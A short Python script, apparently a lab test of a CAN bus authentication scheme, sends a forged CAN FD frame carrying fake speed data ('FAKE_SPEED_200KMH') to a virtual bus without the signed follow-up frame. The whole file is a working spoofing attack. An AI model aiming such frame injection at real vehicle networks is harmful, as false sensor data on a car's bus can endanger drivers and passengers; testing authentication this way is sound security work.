import can

def run_spoofing_attack(channel='virtual_bus', interface='virtual', target_id=0x000):
    bus = can.interface.Bus(channel=channel, bustype=interface, fd=True)

    try:
        fake_data = b"FAKE_SPEED_200KMH"
        
        # Intenta inyectar una trama de datos sin enviar el Frame 2 con firma valida
        msg = can.Message(arbitration_id=target_id, data=fake_data, is_fd=True,is_extended_id=False,)
        bus.send(msg)
        print(f"[Ataque Spoofing] Trama falsificada enviada a ID: {hex(target_id)}")

    finally:
        bus.shutdown()

if __name__ == "__main__":
    run_spoofing_attack()